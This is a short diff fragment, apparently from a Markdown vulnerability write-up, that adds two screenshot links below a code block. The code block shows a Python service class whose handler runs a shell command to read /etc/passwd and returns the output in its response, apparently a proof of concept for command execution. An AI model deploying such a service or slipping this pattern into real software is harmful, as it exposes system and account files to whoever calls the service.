@@ -14,3 +14,6 @@ class OeNotice(Service):
     def handle(self):
         self.response.payload={'result':os.popen("cat /etc/passwd").read()}
 ```
+
+![](./20211013134358.png)
+![](./20211013134517.png)
